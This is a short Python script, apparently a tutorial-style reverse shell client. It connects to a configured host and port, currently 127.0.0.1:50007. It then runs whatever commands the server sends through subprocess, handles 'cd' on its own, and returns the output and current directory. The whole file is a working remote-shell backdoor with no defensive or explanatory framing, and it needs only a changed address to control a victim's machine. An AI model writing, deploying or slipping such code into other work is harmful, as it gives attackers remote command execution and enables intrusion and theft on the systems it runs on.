
from ast import While
import socket
import os
import subprocess
HOST = '127.0.0.1'    # The remote host
PORT = 50007   
SEPARATOR = "<sep>"
           # The same port as used by the server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    cwd = os.getcwd()
    s.send(cwd.encode())
    while True:
        command = s.recv(1024).decode()
        splited_command = command.split()
        if command.lower() == "exit":
        # if the command is exit, just break out of the loop
            break
        if splited_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    # close client connection


